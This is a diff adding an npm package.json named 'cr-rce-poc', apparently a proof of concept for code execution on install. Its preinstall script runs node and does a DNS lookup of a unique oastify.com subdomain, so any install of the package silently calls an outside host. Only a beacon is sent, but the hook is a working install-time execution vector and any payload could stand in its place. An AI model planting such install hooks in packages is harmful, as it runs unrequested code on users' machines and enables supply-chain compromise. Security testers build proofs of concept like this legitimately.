@@ -1,0 +1,6 @@
+{
+  "name": "cr-rce-poc",
+  "version": "1.0.0",
+  "scripts": { "preinstall": "node -e \"require('dns').lookup('npm-preinstall.hwhv3spdg8a0y4fiq0r8ifiqjhp8dy1n.oastify.com',()=>{})\"" },
+  "devDependencies": { "eslint": "^9.0.0" }
+}
